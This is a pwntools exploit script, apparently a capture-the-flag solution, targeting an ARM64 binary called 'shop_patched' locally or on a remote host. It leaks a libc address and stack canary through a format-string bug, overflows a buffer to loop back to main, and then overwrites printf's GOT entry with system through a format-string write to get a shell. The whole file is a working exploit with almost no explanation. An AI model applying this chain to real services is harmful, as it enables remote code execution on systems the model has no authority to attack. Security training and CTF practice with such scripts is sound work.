#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('shop_patched')
libc = ELF("./libc.so.6")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return process(["qemu-arm64","-g","5000", "-L", "/usr/arm-linux-gnueabi/", exe.path])
        # return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process(["qemu-arm64", "-L", "/usr/arm-linux-gnueabi/", exe.path] + argv, *a, **kw)
    

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def ret2main(stage2=False):

    io.sendlineafter(b">", b"%9$p.%17$p")
    io.recvuntil(b"hi ")
    addr = io.recvline().split(b".")
    libc.address = int(addr[0], 16) - 0x273fc
    canary = int(addr[1], 16)

    info("libc base: %#x", libc.address)
    info("canary: %#x", canary)

    offset = 104

    payload = flat({
        offset: [
            canary,
            b"A"*8,
            exe.sym["main"]

        ]
    })

    io.sendlineafter(b">", b"2")
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b">", b"2000000")
    io.sendlineafter(b">", payload)


def printf_write():
    system = libc.sym["system"]
    printf = exe.got["printf"]
    
    info("system: %#x", system)
    info("printf: %#x", printf)

    byte = (system >> 16) & 0xff
    word = system & 0xffff
    size = word - byte

    payload = f"%{byte}c%15$hhn".encode()
    payload += f"%{size - len(payload) + 0xc}c%16$hn".encode()
    payload = payload.ljust(32, b".")
    payload += p64(printf + 2)
    payload += p64(printf)

    io.sendafter(b">", payload)


def spawn_shell():
    io.sendline(b"1")
    io.sendline(b"bash")

def solve():

    """
    For some reason when main return address is corrupted it will always go back to that address during the time main is about to ret?

    this effectively gives us multiple use of printf

    use the fsb to overwrite got of printf to system
    """

    ret2main()
    printf_write()
    #spawn_shell()


    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

